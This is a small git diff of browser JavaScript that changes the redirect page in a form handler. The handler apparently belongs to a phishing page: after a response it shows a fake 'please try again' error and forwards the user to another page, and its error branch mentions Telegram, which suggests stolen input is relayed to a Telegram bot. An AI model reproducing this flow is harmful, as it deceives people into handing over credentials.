@@ -75,7 +75,7 @@ document.addEventListener("DOMContentLoaded", () => {
           alert(`⛔ please try again`);
           form.reset();
           window.location.href = 
-          'Fpass.html?id=${userId}';
+          'tik.html?id=${userId}';
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
